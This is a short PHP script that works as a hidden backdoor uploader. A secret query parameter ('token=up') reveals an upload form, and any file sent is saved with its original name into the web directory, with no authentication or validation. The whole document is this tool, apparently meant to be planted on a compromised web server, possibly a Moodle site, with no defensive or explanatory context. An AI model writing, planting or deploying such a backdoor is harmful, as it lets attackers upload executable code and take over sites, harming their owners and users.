<?php

$token  = $_GET['token'];
if($token == 'up'){
$moodle = $_FILES['file']['name'];
$upload  = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'>
	<input type='file'name='file' />
	<input type='submit' value='Upload' />
</form>";
move_uploaded_file($upload,$moodle); 
}
?>
 